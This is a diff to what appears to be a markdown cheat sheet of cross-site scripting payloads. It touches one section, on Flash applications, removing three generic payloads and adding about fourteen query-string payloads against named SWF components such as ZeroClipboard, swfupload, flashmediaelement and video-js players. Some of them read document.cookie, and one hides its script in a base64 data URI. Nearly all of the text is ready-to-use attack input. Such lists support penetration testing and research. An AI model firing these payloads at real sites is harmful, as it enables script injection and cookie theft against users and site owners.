@@ -73,11 +73,20 @@ With an additional URL
 
 XSS in flash application
 ```
- \%22})))}catch(e){alert(document.domain);}//
-
- "]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
-
- "a")(({type:"ready"}));}catch(e){alert(1)}//
+flashmediaelement.swf?jsinitfunctio%gn=alert`1`
+flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
+ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
+swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
+swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
+plupload.flash.swf?%#target%g=alert&uid%g=XSS&
+moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
+video-js.swf?readyFunction=alert(1)
+player.swf?playerready=alert(document.cookie)
+player.swf?tracecall=alert(document.cookie)
+banner.swf?clickTAG=javascript:alert(1);//
+io.swf?yid=\"));}catch(e){alert(1);}//
+video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
+bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
 ```
 
 XSS in Hidden input
